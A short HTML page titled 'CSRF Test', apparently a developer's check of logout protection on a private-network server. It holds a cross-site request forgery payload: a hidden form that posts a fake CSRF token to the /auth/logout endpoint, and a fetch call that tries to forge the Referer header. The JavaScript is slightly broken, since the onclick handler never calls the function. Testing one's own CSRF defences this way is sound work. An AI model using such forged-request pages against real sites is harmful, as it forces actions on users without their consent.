<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Test</title>
</head>
<body>
    <h1>CSRF Attack Test</h1>
    <form action="https://172.20.101.145:8443/auth/logout" method="POST">
        <input type="hidden" name="csrf_token" value="fake_token">
        <button type="submit">Logout</button>
    </form>
    <button onclick="forgeRequestWithoutReferer">LogoutJSWithReferer</button>
    <script>
        function forgeRequestWithoutReferer() {
            fetch(
                'https://172.20.101.145:8443/auth/logout',
                {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Referer': '172.20.101.145'
                    },
                    body: JSON.stringify({
                    })
                }
            )
        }
    </script>
</body>
</html>
